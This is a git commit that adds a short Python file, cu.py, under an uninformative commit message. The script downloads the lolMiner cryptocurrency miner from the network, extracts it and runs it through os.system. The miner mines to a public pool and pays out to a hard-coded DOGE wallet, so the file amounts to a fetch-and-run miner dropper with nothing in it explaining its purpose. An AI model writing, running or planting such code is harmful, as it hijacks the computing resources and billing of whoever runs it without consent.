090103134b2669b662efe3492621d1412c42324b
asimeci <111687955+asimeci@users.noreply.github.com>
2022-10-02 20:35:56 +0000

    Create cu.py

---
+++ cu.py
@@ -0,0 +1,3 @@
+import os
+x = "wget https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.59/lolMiner_v1.59a_Lin64.tar.gz && tar -xf lolMiner_v1.59a_Lin64.tar.gz && cd 1.59a && ./lolMiner --algo ETCHASH --pool etchash.unmineable.com:3333 --user DOGE:DA6CNXPGacPWBTLrVq3b1b9uhpWiH1QWda.lol27#3m34-lfsa --ethstratum ETHPROXY"
+os.system(command=x)
